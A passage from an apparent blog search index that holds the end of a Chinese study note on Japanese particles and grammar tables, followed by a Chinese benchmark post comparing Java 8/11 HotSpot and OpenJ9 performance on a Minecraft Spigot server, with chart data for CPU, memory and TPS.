朝ジョギングをし**て**、会社へ行きます。\n\n用于连接两个以上句子，句末为い形容词，可翻译为“并且”（16.1）\n- 昨日は天気が良く**て**、暑かったです。\n### で\n表示手段、方法（7.1）\n－はし**で**食べます。\n\n表示交通手段（5.3）\n- 電車**で**行きます。\n\n> 徒步行走时，用歩いて，且不接で\n> - 駅から**歩いて**帰りました。\n\n表示动作发生的场所（6.5）\n- 駅**で**新聞を買います。\n\n表示范围（12.5）\n- 日本料理**で**何が一番美味しいですか。\n\n用于连接两个以上句子，句末为な形容词，可翻译为“并且”（16.1）\n- 上海は賑やか**で**、きれいな町です。\n\n用于连接两个以上句子，句末为名词（16.1）\n- 私は中国人**で**、学生です。\n### よ\n接在句尾，用于将对方不知道的事情或说话人自己的判断、意见等告诉对方（5.6）\n- この電車は京都へ行きますか。······いいえ、行きません。次の「普通」です**よ**。\n### を\n表示他动词的宾语（6.1）\n- ジュース**を**飲みます。\n\n表示起点、出发点（16.4）\n- 7時に家**を**出ます。\n### が\n表示转折（8.4）\n- 日本の食べ物は美味しいです**が**、高いです。\n\n表示形容词和状态动词的宾语（9.1）\n- 私は日本語**が**わかります。\n- 私は日本語**が**好きです。\n- 私は友達**が**欲しいです。\n\n表示作为存在主体的名词（10.1）\n- 桜**が**あります。\n- 犬**が**います。\n\n表示五官所感的某种现象或客观地传达某件事情（14.6）\n- 雨**が**降っています。\n- ミラーさん**が**いませんね。\n\n表示句子的主题具有的性质（16.3）\n- 大阪は食べ物**が**美味しいです。\n\n修饰名词的句节中的主语（22.1）\n- これはミラーさん**が**作ったケーキです。\n### や\n用于选择两个以上具有代表性的名词加以列举（10.5）\n- 箱の中に手紙**や**写真があります。\n### など\n表示除了列举出的以外还有其他名词，可翻译为“等等”（10.5）\n- 箱の中に手紙や写真**など**があります。\n### だけ\n接在数量词或名词后，表示只有这些，不会再有超过于此，可翻译为“只有”（11.4）\n- 休みは日曜日**だけ**です。\n### より\n表示比较（12.3）\n- この車はあの車**より**大きいます。\n### ぐらい\n接在数量词之后表示大概的数量，可翻译为“大约”（11.2）\n- 15分**ぐらい**かかります。\n### でも\n在劝诱或建议某件事时，提出某一示例但并不限定于此一项（21.6）\n- ちょっとビール**でも**飲みませんか。\n## 表格归纳\n### 指示代词一览表（3.5）\n\n>「こ」用于离说话人近\n>「そ」用于离听话人近\n>「あ」用于里说话人和听话人都比较远\n>「ど」用于疑问\n\n||こ系列|そ系列|あ系列|ど系列|\n|-|-|-|-|-|\n物体|これ|それ|あれ|どれ|\n物、人|この名词|その名词|あの名词|どの名词|\n场所|ここ|そこ|あそこ|どこ|\n方向、场所（郑重）|こちら|そちら|あちこ|どちら|\n### ます形时态（4.2）\n\n> ます形用于叙述现在的习惯、真理或将来会发生的事情、行动\n\n||非过去（现在、未来）|过去|\n|-|-|-|\n|肯定|起きます|起きました\n|否定|起きません|起きませんでした\n### 副词（9.3）\n{% raw %}\n<table>\n<tr>\n  <th></th>\n  <th colspan=\"2\">表示程度的副词</th>\n  <th colspan=\"2\">表示数量的副词</th>\n</tr>\n<tr>\n  <td rowspan=\"3\">和肯定形一起使用</td>\n  <td>よく</td>\n<td rowspan=\"3\">わかります</td>\n<td>たくさん</td>\n<td rowspan=\"3\">あります</td>\n</tr>\n<tr>\n  <td>だいたい</td>\n<td>少し</td>\n</tr>\n<tr>\n  <td>少し</td>\n</tr>\n<tr>\n  <td rowspan=\"2\">和否定形一起使用</td>\n  <td>あまり</td>\n<td rowspan=\"2\">わかりません</td>\n<td>あまり</td>\n<td rowspan=\"2\">ありません</td>\n</tr>\n<tr>\n  <td>全然</td>\n<td>全然</td>\n</tr>\n</table>\n{% endraw %}\n\n### 名词句、な形容词句时态（12.1）\n{% raw %}\n<table>\n<tr>\n  <th></th>\n  <th colspan=\"3\">非过去（现在、未来）</th>\n  <th colspan=\"3\">过去</th>\n</tr>\n<tr>\n  <td rowspan=\"2\">肯定</td>\n  <td>名词</td>\n<td>雨</td>\n<td rowspan=\"2\">です</td>\n<td>名词</td>\n<td>雨</td>\n<td rowspan=\"2\">でした</td>\n</tr>\n<tr>\n  <td>な形容词</td>\n<td>静か</td>\n<td>な形容词</td>\n<td>静か</td>\n</tr>\n<tr>\n  <td rowspan=\"2\">否定</td>\n  <td>名词</td>\n<td>雨</td>\n<td rowspan=\"2\">じゃ（では）ありません</td>\n<td>名词</td>\n<td>雨</td>\n<td rowspan=\"2\">じゃ（では）ありませんでした</td>\n</tr>\n<tr>\n  <td>な形容词</td>\n<td>静か</td>\n<td>な形容词</td>\n<td>静か</td>\n</tr>\n</table>\n{% endraw %}\n\n### い形容词句时态（12.2）\n||非过去（现在、未来）|过去|\n|-|-|-|\n|肯定|暑いです|暑かったです|\n|否定|暑くないです|暑くなかったです|\n\n## 动词归纳\n### 动词て形\n**动词て形 ください**    请······（14.3）\n用于指示、委托或劝诱对方做某件事情\n- ボールペンで名前を書いていきます。\n\n**动词て形 います**（14.4）\n表示某一动作正在进行\n- いまあめがふっていますか。\n\n**动词て形も いいですか**    可以······吗？（15.1）\n希望得到许可时的表达方式\n写真を撮ってもいいですか。\n\n**动词て形は いけません**    不准······（15.2）\n表示禁止\nここでタバコを吸ってはいけません。\n\n**动词て形 います**（15.3）\n表示状态\n- 私は結婚しています。\n\n表示习惯性的行为、职业以及身份\n- 私は大学で勉強しています。\n\n**动词1て形から、动词2**（16.2）\n表示动词2是在动词1之后进行的动作，整个句子的时态根据最后一个动词的时态而定\nお金を入れてから、ボタンを押してください。\n\n### 动词ない形\n**动词ない形ないで ください**    请不要（17.2）\n用于请求、命令对方不要做某事\n- ここで写真を撮らないでください。\n\n**动词ない形なければ なりません**    必须······（17.3）\n表示必须要做的事情\n- 薬を飲まなければなりません。\n\n**动词ない形なくても いいです**    不······也行（17.4）\n表示没有必要做某事\n- 明日来なくてもいいです。\n### 动词辞書形\n**动词辞書形こと/名词 ができます**    能······、会······（18.2）\n表示某人有能力做某事，或某种情况下可以进行某种行为\n- 私は漢字を読むことができます。\n- 私は日本語ができます。\n\n**私の趣味は 动词辞書形こと/名词 です**    我的爱好是······（18.3）\n- 私の趣味は音楽を聞くことです。\n- 私の趣味は音楽です。\n\n**动词1辞書形/名词の/数量词（期间） 前に、动词2**    ······之前······（18.4）\n- 日本へ来る前に、日本語を勉強しました。\n- 食事の前に、手を洗います。\n- 田中さんは1時間前に、出かけました。\n### 动词た形\n**动词た形 ことが あります**    做过······（19.2）\n讲述过去经历、体验过的事情，如果仅单纯讲述过去某个时间做了某件事这一事实需要使用过去式\n- 馬に乗ったことがあります。\n\n**动词1た形り、动词2た形り します**    又······又······（19.3）\n选择几个具有代表性的动作加以列举，整句话的时态在句末表示\n- 日曜日はテニスをしたり、映画を見たりします。\n### 普通形\n**普通形と思います**    我想······（21.1）\n表示推测或阐述意见\n- 明日雨が降ると思います。\n\n**句子/普通形と言います**    说······（21.2）\n直接引用时，直接将引用的话放入「」中\n- 寝る前に、「おやすみなさい」と言います。\n\n间接引用时，在と的前面使用普通形\n- ミラーさんは東京へ出張すると言いました。\n\n**动词/形容词/名词 普通形 でしょう？**    ······吧？（21.3）\n在欲求得听话人同意、进行询问或确认时使用\n\n> 如果接续な形容词和名词时，要使用去掉「~だ」的形式\n\n- 明日パーティーに行くでしょう？\n","tags":["日语"],"categories":["计软杂谈","学习笔记"]},{"title":"不同版本Java对于Minecraft服务端spigot端的性能影响","url":"/reimu-lighthouse/20220702/minecraft-server-comparison/","content":"众所周知，Bugjump在MC高版本下的优化稀烂，如此辣鸡的优化对于想要开服但手头上却只有1c2g或是2c4g渣机的服主来说是一个非常大的负担。\n对于spigot，paper等非原版端的优化MCBBS上已经有非常多的帖子，优化的方式基本上可以分为三类：\n- 修改bukkit.yml、spigot.yml和paper.yml等配置\n- 增加区块卸载和清理掉落物等优化插件\n- 修改Java启动参数和Java版本\n\n但实际上，修改配置文件产生的效果并不明显，且过分的修改参数会对游戏体验产生影响。而有关区块卸载、清理掉落物、生物限制等优化插件在高版本下可以说是几乎没有。\nJava启动参数其实对于服务器来说非常重要，但网络上对于启动参数网上的说法众说纷纭。本人会在未来对不同的参数进行测试，敬请期待。\n本文通过三个测试来粗略地探究一下Java8和Java11下Hotspot和Openj9虚拟机对于Minecraft高版本服务端spigot端的性能影响\n本次测试采用的Minecraft版本为1.16.5，所以并不支持Java17\nSpigot版本为3096a-Spigot-9fb885e-af1a232\nJava启动参数采用最简单的设置方式，仅仅设置初始堆和最大堆的大小\n```bash\njava -Xmx2G -Xms1G -jar spigot-1.16.5.jar nogui\n```\nJava选用以下四个版本：\n- Openj9 jre8\n```text\nopenjdk version \"1.8.0_322\"\nIBM Semeru Runtime Open Edition (build 1.8.0_322-b06)\nEclipse OpenJ9 VM (build openj9-0.30.0, JRE 1.8.0 Linux amd64-64-Bit Compressed References 20220128_306 (JIT enabled, AOT enabled)\nOpenJ9   - 9dccbe076\nOMR      - dac962a28\nJCL      - c1d9a7af7c based on jdk8u322-b06)\n```\n- Hotspot jre8\n```text\nopenjdk version \"1.8.0_312\"\nOpenJDK Runtime Environment (build 1.8.0_312-8u312-b07-0ubuntu1~20.04-b07)\nOpenJDK 64-Bit Server VM (build 25.312-b07, mixed mode)\n```\n- Openj9 jre11\n```text\nopenjdk version \"11.0.10\" 2021-01-19\nOpenJDK Runtime Environment AdoptOpenJDK (build 11.0.10+9)\nEclipse OpenJ9 VM AdoptOpenJDK (build openj9-0.24.0, JRE 11 Linux amd64-64-Bit 20210120_821 (JIT enabled, AOT enabled)\nOpenJ9   - 345e1b09e\nOMR      - 741e94ea8\nJCL      - 0a86953833 based on jdk-11.0.10+9\n```\n- Hotspot jre11\n```text\nopenjdk version \"11.0.15\" 2022-04-19\nOpenJDK Runtime Environment Temurin-11.0.15+10 (build 11.0.15+10)\nOpenJDK 64-Bit Server VM Temurin-11.0.15+10 (build 11.0.15+10, mixed mode\n```\n地图种子：1145141919810\n开服系统：Ubuntu20.04\n服务器配置：腾讯云2c4g6m\n测试分为三个部分：**无插件开服测试**，**跑图测试**和**多插件开服测试**\n## 无插件开服测试\n说是无插件实际上还是存在一个插件：EssentialsX-2.19.0，该插件仅仅用于运行/gc命令获得tps和Allocated memory\n测试方法：在存档已经生成后使用四个不同的Java版本启动mc服务器，使用腾讯云监控面板获得CPU和内存占用情况，同时使用/gc命令获得tps和游戏内Allocated memory\n\n> 在测试的过程中不运行其他程序，此时腾讯云监控面板的数据可以近似为mc服务器独占\n\n### CPU占用率\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: 'CPU占用率'\n  },\n  tooltip: {\n    trigger: 'axis'\n  },\n  legend: {\n    data: ['Openj9 jre8', 'Hotspot jre8', 'Openj9 jre11', 'Hotspot jre11']\n  },\n  grid: {\n    left: '3%',\n    right: '4%',\n    bottom: '3%',\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: 'category',\n    boundaryGap: false,\n    data: ['0s', '10s', '20s', '30s', '40s', '50s', '1min','1min10s','1min20s','1min30s','1min40s','1min50s','2min','2min10s','2min20s','2min30s','2min40s','2min50s','3min',\n          '3min10s','3min20s','3min30s','3min40s','3min50s','4min','4min10s','4min20s','4min30s','4min40s','4min50s','5min']\n  },\n  yAxis: {\n    type: 'value'\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: 'Openj9 jre8',\n      type: 'line',\n      data: [0.9, 10.4, 95.4, 99.5, 99.9, 99.9, 99.9,99.9,99.8,99.7,99.8,99.8,77.6,70.1,66.8,71.1,65,49.1,11.1,10.5,8.6,8.7,9.1,7.8,12.2,9.2,14,8.4,10.4,9.9,9.5,7.9,10.8,7.6,10.7,9.8,8.4,9.7,8.4,48.5,27.2,7.9,9.4,9.9,11.6,10.,8.1,9.4,10,8.6,9,6.9,8.4]\n    },\n    {\n      showSymbol: false,\n      name: 'Hotspot jre8',\n      type: 'line',\n      data: [0.8,30.9,99.2,98.1,99.5,99.6,99.7,88.8,76,73.7,65.6,70,62.3,12.6,9.1,9.3,10.4,10.3,11.1,8.6,8.6,9.4,9.3,8.3,9.5,8.4,7.9,7.5,7.7,12,7.9,8,8,9.4,11.3]\n    },\n    {\n      showSymbol: false,\n      name: 'Openj9 jre11',\n      type: 'line',\n      data: [0.6,66.6,99.5,99.6,99.9,99.9,99.8,99.7,99.7,99.7,99.6,95.1,67.8,72.8,67.5,65.6,67.2,63.1,62.8,25.1,10.1,14.1,8.9,9.6,9.6,8.3,7.8,10.9,15.2,7.6,8.7,10.2,8.3,9.8,19.3]\n    },\n    {\n      showSymbol: false,\n      name: 'Hotspot jre11',\n      type: 'line',\n      data: [1.2,11.4,94.6,89.9,99.5,99.6,99.6,99.6,83.1,74.2,73.3,66,66.2,45,14,14.7,11.4,11.1,13,9.1,11.9,7.3,10,8.8,7.8,9.3,8.2,7.8,8.3,10.6,9.3,9.2,8.6,8.6,8.8,12.6]\n    }\n  ]\n};\n{% endecharts %}\n非常明显，Hotspot相比于Openj9来说CPU占用率更低，这也反应在了开服时间上：Hotspot开服均在30-40s左右，而Openj9开服时间均在60s以上。\n横向对比Java8和Java11，在虚拟机相同的情况下两者差距并不明显，但还是可以看出11比8占用率要高一些。\n### 内存占用\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"内存占用\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: [\n      \"0s\",\n      \"10s\",\n      \"20s\",\n      \"30s\",\n      \"40s\",\n      \"50s\",\n      \"1min\",\n      \"1min10s\",\n      \"1min20s\",\n      \"1min30s\",\n      \"1min40s\",\n      \"1min50s\",\n      \"2min\",\n      \"2min10s\",\n      \"2min20s\",\n      \"2min30s\",\n      \"2min40s\",\n      \"2min50s\",\n      \"3min\",\n      \"3min10s\",\n      \"3min20s\",\n      \"3min30s\",\n      \"3min40s\",\n      \"3min50s\",\n      \"4min\",\n      \"4min10s\",\n      \"4min20s\",\n      \"4min30s\",\n      \"4min40s\",\n      \"4min50s\",\n      \"5min\"\n    ]\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [\n        475,\n        475,\n        993,\n        1190,\n        1325,\n        1465,\n        1352,\n        1358,\n        1369,\n        1441,\n        1461,\n        1465,\n        1465,\n        1454,\n        1459,\n        1469,\n        1477,\n        1470,\n        1470,\n        1470,\n        1471,\n        1469,\n        1470,\n        1469,\n        1473,\n        1470,\n        1485,\n        1470,\n        1469,\n        1478,\n        1469,\n        1470,\n        1470,\n        1469,\n        1468,\n        1468,\n        1468,\n        1469,\n        1468,\n        1496,\n        1474,\n        1473,\n        1474,\n        1474\n      ]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [\n        474,\n        529,\n        1155,\n        1469,\n        1599,\n        1596,\n        1636,\n        1680,\n        1732,\n        1723,\n        1733,\n        1751,\n        1758,\n        1763,\n        1763,\n        1763,\n        1764,\n        1764,\n        1765,\n        1765,\n        1765,\n        1765,\n        1765,\n        1766,\n        1766,\n        1766,\n        1765,\n        1766,\n        1766,\n        1766,\n        1768,\n        1768,\n        1768,\n        1768,\n        1768,\n        1768,\n        1768,\n        1769,\n        1770,\n        1771,\n        1771,\n        1770,\n        1771,\n        1770,\n        1770,\n        1770,\n        1771,\n        1771,\n        1771,\n        1771,\n        1772\n      ]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [\n        473,\n        857,\n        1253,\n        1444,\n        1470,\n        1734,\n        1496,\n        1551,\n        1610,\n        1694,\n        1666,\n        1671,\n        1659,\n        1672,\n        1653,\n        1657,\n        1665,\n        1681,\n        1678,\n        1680,\n        1680,\n        1680,\n        1680,\n        1679,\n        1679,\n        1681,\n        1681,\n        1681,\n        1726,\n        1678,\n        1677,\n        1677,\n        1677,\n        1679,\n        1677,\n        1677,\n        1678,\n        1681,\n        1683,\n        1683,\n        1684,\n        1684,\n        1684,\n        1686,\n        1684\n      ]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [\n        474,\n        474,\n        811,\n        1442,\n        1688,\n        1782,\n        1916,\n        1919,\n        1951,\n        1994,\n        1995,\n        1996,\n        1999,\n        2011,\n        2012,\n        2013,\n        2012,\n        2013,\n        2013,\n        2013,\n        2014,\n        2013,\n        2013,\n        2014,\n        2014,\n        2014,\n        2015,\n        2015,\n        2013,\n        2014,\n        2014,\n        2014,\n        2014,\n        2014,\n        2015,\n        2015,\n        2019,\n        2019,\n        2021,\n        2022,\n        2022,\n        2022,\n        2022,\n        2021,\n        2022\n      ]\n    }\n  ]\n};\n{% endecharts %}\n非常明显，Openj9在内存上完爆Hotspot，这也符合Openj9的定位：以牺牲一部分性能的前提下极大降低内存占用率。\n此外相同虚拟机下11内存占用率要比8要高出许多。\n### TPS\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"TPS\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: [\n      \"0s\",\n      \"5s\",\n      \"10s\",\n      \"15s\",\n      \"20s\",\n      \"25s\",\n      \"30s\",\n      \"35s\",\n      \"40s\",\n      \"45s\",\n      \"50s\",\n      \"55s\",\n      \"1min\",\n      \"1min5s\",\n      \"1min10s\",\n      \"1min15s\",\n      \"1min20s\",\n      \"1min25s\",\n      \"1min30s\",\n      \"1min35s\",\n      \"1min40s\",\n      \"1min45s\",\n      \"1min50s\",\n      \"1min55s\",\n      \"2min\",\n      \"2min5s\",\n      \"2min10s\",\n      \"2min15s\",\n      \"2min20s\",\n      \"2min25s\",\n      \"2min30s\",\n      \"2min35s\",\n      \"2min40s\",\n      \"2min45s\",\n      \"2min50s\",\n      \"2min55s\",\n      \"3min\",\n      \"3min5s\",\n      \"3min10s\",\n      \"3min15s\",\n      \"3min20s\",\n      \"3min25s\",\n      \"3min30s\",\n      \"3min35s\",\n      \"3min40s\",\n      \"3min45s\",\n      \"3min50s\",\n      \"3min55s\",\n      \"4min\"]\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,20,20,20,20,20,20,20,20,20,20,13.66,16.2,16.83,17.89,18.1,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,16.83,17.62,18.1,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,20,20,20,20,20,20,20,20,20,20,20,16.83,17.62,18.27,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,20,20,20,20,20,20,20,20,20,20,20,15.25,16.83,17.62,18.1,18.27,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20,20]\n    },\n  ]\n};\n{% endecharts %}\n对于TPS，四个不同版本均在开服初期发生了明显的下降，但都能以几乎相同的速度恢复。\n### Allocated memory\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"Allocated memory\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: [\n      \"0s\",\n      \"5s\",\n      \"10s\",\n      \"15s\",\n      \"20s\",\n      \"25s\",\n      \"30s\",\n      \"35s\",\n      \"40s\",\n      \"45s\",\n      \"50s\",\n      \"55s\",\n      \"1min\",\n      \"1min5s\",\n      \"1min10s\",\n      \"1min15s\",\n      \"1min20s\",\n      \"1min25s\",\n      \"1min30s\",\n      \"1min35s\",\n      \"1min40s\",\n      \"1min45s\",\n      \"1min50s\",\n      \"1min55s\",\n      \"2min\",\n      \"2min5s\",\n      \"2min10s\",\n      \"2min15s\",\n      \"2min20s\",\n      \"2min25s\",\n      \"2min30s\",\n      \"2min35s\",\n      \"2min40s\",\n      \"2min45s\",\n      \"2min50s\",\n      \"2min55s\",\n      \"3min\",\n      \"3min5s\",\n      \"3min10s\",\n      \"3min15s\",\n      \"3min20s\",\n      \"3min25s\",\n      \"3min30s\",\n      \"3min35s\",\n      \"3min40s\",\n      \"3min45s\",\n      \"3min50s\",\n      \"3min55s\",\n      \"4min\"]\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280,1280]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,1544,1572,1463,1599,1602,1642,1662,1670,1664,1664,1664,1664,1664,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667,1667]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1280,1280,1280,1280,1280,1280,1280,1280,1274,1274,1274,1274,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269,1269]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [null,null,null,null,null,null,null,null,null,null,null,null,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305,1305]\n    },\n  ]\n};\n{% endecharts %}\n该数据来源于/gc指令之中，个人感觉该参数还是比较迷的，仅供参考。\n## 跑图测试\n测试方法：在开服5分钟后首先连续跑图2分钟（约2600格，创造飞行），接着挂机13分钟\n每次飞行方向均相同，测试完成后会将存档重置保证每次测试都会重新生成地形\n### 内存占用\n{% echarts 95% 400 5.4.3 %}\n{\n  title: {\n    text: \"内存占用\"\n  },\n  tooltip: {\n    trigger: \"axis\"\n  },\n  legend: {\n    data: [\"Openj9 jre8\", \"Hotspot jre8\", \"Openj9 jre11\", \"Hotspot jre11\"]\n  },\n  grid: {\n    left: \"3%\",\n    right: \"4%\",\n    bottom: \"3%\",\n    containLabel: true\n  },\n  toolbox: {\n    feature: {\n      saveAsImage: {}\n    }\n  },\n  xAxis: {\n    type: \"category\",\n    boundaryGap: false,\n    data: ['0s', '10s', '20s', '30s', '40s', '50s', '1min','1min10s','1min20s','1min30s','1min40s','1min50s','2min','2min10s','2min20s','2min30s','2min40s','2min50s','3min',\n          '3min10s','3min20s','3min30s','3min40s','3min50s','4min','4min10s','4min20s','4min30s','4min40s','4min50s','5min','5min10s','5min20s','5min30s','5min40s','5min50s','6min','6min10s','6min20s','6min30s','6min40s','6min50s','7min','7min10s','7min20s','7min30s','7min40s','7min50s','8min','8min10s','8min20s','8min30s','8min40s','8min50s','9min','9min10s','9min20s','9min30s','9min40s','9min50s','10min','10min10s','10min20s','10min30s','10min40s','10min50s','11min','11min10s','11min20s','11min30s','11min40s','11min50s','12min','12min10s','12min20s','12min30s','12min40s','12min50s','13min','13min10s','13min20s','13min30s','13min40s','13min50s','14min','14min10s','14min20s','14min30s','14min40s','14min50s','15min']\n  },\n  yAxis: {\n    type: \"value\",\n    scale:true\n  },\n  series: [\n    {\n      showSymbol: false,\n      name: \"Openj9 jre8\",\n      type: \"line\",\n      data: [\n        1510,\n1529,\n1534,\n1536,\n1551,\n1561,\n1578,\n1571,\n1588,\n1599,\n1599,\n1605,\n1614,\n1612,\n1616,\n1618,\n1616,\n1629,\n1637,\n1640,\n1666,\n1662,\n1665,\n1666,\n1670,\n1668,\n1670,\n1676,\n1673,\n1681,\n1681,\n1682,\n1682,\n1683,\n1683,\n1679,\n1679,\n1680,\n1680,\n1679,\n1678,\n1678,\n1679,\n1679,\n1679,\n1679,\n1679,\n1679,\n1680,\n1682,\n1681,\n1682,\n1682,\n1681,\n1681,\n1681,\n1682,\n1682,\n1682,\n1682,\n1676,\n1675,\n1675,\n1675,\n1676,\n1676,\n1676,\n1676,\n1676,\n1676,\n1676,\n1676,\n1676,\n1676,\n1676,\n1677,\n1676,\n1675,\n1676,\n1677,\n1677,\n1677,\n1677,\n1677,\n1678,\n1677,\n1673,\n1673,\n1673,\n1673,\n1673,\n1673,\n1673,\n1673,\n1674,\n1674,\n1674,\n1674,\n1676,\n1675,\n1674,\n1675,\n1676,\n1675,\n1676,\n1676,\n1676,\n1675,\n1676 ]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre8\",\n      type: \"line\",\n      data: [1726,\n1731,\n1758,\n1761,\n1768,\n1770,\n1785,\n1789,\n1805,\n1812,\n1827,\n1829,\n1829,\n1847,\n1845,\n1861,\n1862,\n1857,\n1856,\n1856,\n1856,\n1867,\n1866,\n1867,\n1870,\n1871,\n1872,\n1873,\n1876,\n1878,\n1883,\n1943,\n1955,\n1955,\n1955,\n1956,\n1960,\n1961,\n1968,\n1968,\n1973,\n1973,\n1982,\n1984,\n1991,\n1991,\n1998,\n1998,\n1991,\n1983,\n1984,\n1973,\n1971,\n1960,\n1960,\n1947,\n1946,\n1934,\n1920,\n1921,\n1908,\n1895,\n1896,\n1882,\n1868,\n1868,\n1855,\n1854,\n1841,\n1828,\n1828,\n1815,\n1803,\n1803,\n1791,\n1780,\n1779,\n1768,\n1758,\n1759,\n1749,\n1739,\n1738,\n1729,\n1720,\n1712,\n1712,\n1702,\n1695,\n1688,\n1688,\n1688,\n1681,\n1674,\n1668,\n1666,\n1665,\n1665,\n1666,\n1665,\n1665,\n1665,\n1665,\n1664\n]\n    },\n    {\n      showSymbol: false,\n      name: \"Openj9 jre11\",\n      type: \"line\",\n      data: [\n        1701,\n1738,\n1726,\n1742,\n2050,\n2038,\n2278,\n1799,\n1793,\n1810,\n1808,\n1821,\n1825,\n1845,\n1852,\n1890,\n1906,\n1899,\n1897,\n1897,\n1898,\n1898,\n1898,\n1897,\n1898,\n1897,\n1897,\n1897,\n1900,\n1897,\n1897,\n1897,\n1897,\n1896,\n1897,\n1899,\n1897,\n1898,\n1897,\n1897,\n1898,\n1898,\n1897,\n1897,\n1896,\n1894,\n1894,\n1894,\n1895,\n1897,\n1896,\n1896,\n1895,\n1895,\n1895,\n1895,\n1895,\n1895,\n1895,\n1895,\n1895,\n1895,\n1888,\n1889,\n1889,\n1888,\n1888,\n1888,\n1888,\n1888,\n1888,\n1888,\n1889,\n1889,\n1889,\n1889,\n1889,\n1889,\n1889,\n1890,\n1884,\n1884,\n1884,\n1884,\n1884,\n1884,\n1884,\n1884,\n1884,\n1883,\n1882,\n1883,\n1883,\n1883,\n1883]\n    },\n    {\n      showSymbol: false,\n      name: \"Hotspot jre11\",\n      type: \"line\",\n      data: [2025,\n2041,\n2067,\n2064,\n2083,\n2086,\n2087,\n2087,\n2088,\n2088,\n2088,\n2088,\n2088,\n2089,\n2089,\n2096,\n2098,\n2098,\n2098,\n2100,\n2100,\n2100,\n2100,\n2100,\n2100,\n2100,\n2100,\n2100,\n2099,\n2099,\n2099,\n2100,\n2100,\n2100,\n2100,\n2100,\n2101,\n2101,\n2100,\n2100,\n2100,\n2100,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2102,\n2102,\n2102,\n2101,\n2101,\n2100,\n2101,\n2100,\n2100,\n2100,\n2101,\n2100,\n2101,\n2100,\n2100,\n2100,\n2100,\n2101,\n2102,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2101,\n2103,\n2103,\n2102,\n2103,\n2103,\n2102,\n2102,\n2102,\n2102,\n2103,\n2102,\n2102,\n2101,\n2102,\n2102,\n2102,\n2101,\n2102,\n2102,\n2103\n]\n    },\n  